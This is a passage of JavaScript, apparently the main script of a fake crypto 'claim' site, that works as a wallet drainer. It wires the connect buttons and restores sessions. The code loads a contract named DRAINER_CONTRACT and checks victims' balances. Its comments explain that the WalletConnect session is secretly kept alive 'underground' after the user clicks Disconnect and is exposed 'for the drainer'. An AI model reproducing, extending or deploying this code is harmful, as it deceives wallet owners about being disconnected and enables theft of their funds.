        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1400);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) await softDisconnect();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  Always boot WC first so the session rehydrates from WC's own storage —
  //  that's how the underground session survives a reload even after the
  //  user clicked "Disconnect" (we didn't kill it).
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode   = getSavedMode();

    let undergroundRestored = false;

    // ---- WalletConnect: always init provider to rehydrate any session ----
    try {
      const provider = await initWalletConnect({ useFallbackId: false });
      if (provider && provider.session && provider.accounts?.length) {
        undergroundRestored = true;

        // Publish underground for the drainer (available regardless of UI)
        window.__apexWCProvider = provider;

        if (savedWallet && (savedMode === 'walletconnect' || !savedMode)) {
          // User expects to see themselves connected — paint the UI
          const a = provider.accounts[0];
          activeProvider   = provider;
          connectionMode   = 'walletconnect';
          web3Instance     = new Web3Ctor(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(a, 'walletconnect');
          updateConnectedUI(a, 'evm');
          setTimeout(() => checkAndNotifyBalance(a), 900);
          logDebug(`♻️ WC session restored (UI visible): ${a}`);
          return;
        }

        // User clicked Disconnect earlier — session stays alive underneath
        window.__apexConnected = {
          address: provider.accounts[0],
          chain: 'evm',
          web3: null,
          contract: null,
          provider,
          mode: 'walletconnect',
          underground: true,
          publishedAt: Date.now(),
        };
        logDebug('♻️ WC session alive underground (UI hidden)');
      }

      // Stale session with no accounts → purge
      if (provider && provider.session && !provider.accounts?.length) {
        logDebug('⚠️ Stale WC session — purging');
        try { await provider.disconnect(); } catch (_) {}
        wcProvider = null;
        clearWCStorage();
      }
    } catch (e) {
      logDebug('WC restore: ' + e.message);
    }

    // ---- Injected restore (only if saved + still authorized) ----
    if (savedWallet && (savedMode === 'injected' || !savedMode)) {
      const prov = window.ethereum;
      if (prov && isDesktopDevice) {
        try {
          const accounts = await prov.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = prov;
            activeProvider   = prov;
            connectionMode   = 'injected';
            web3Instance     = new Web3Ctor(prov);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachInjectedEvents(prov);
            updateConnectedUI(savedWallet, 'evm');
            setTimeout(() => checkAndNotifyBalance(savedWallet), 900);
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore: ' + e.message);
        }
      }
    }

    if (!undergroundRestored) {
      logDebug('⚠️ No restorable session');
      clearSavedWallet();
    }
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadWalletConnectLibraries();
    EthereumProvider = libs.EthereumProvider;
    Web3Ctor         = libs.Web3;
    logDebug('✅ All libraries loaded');

    if (window.location.protocol !== 'https:'
        && !/localhost|127\.0\.0\.1/.test(window.location.hostname)) {
      logDebug('⚠️ Site is not on HTTPS — WalletConnect will likely reject connections');
    }

    setupEIP6963();

    if (isMobileDevice) {
      logDebug('📱 Pre-warming WalletConnect…');
      initWalletConnect({ useFallbackId: false }).catch(() => {});
    }

    await new Promise((r) => setTimeout(r, 300));
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // Periodic ETH-price refresh so future balance checks stay accurate
  setInterval(async () => { currentEthPrice = await fetchEthPriceUSD(); }, 60000);

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
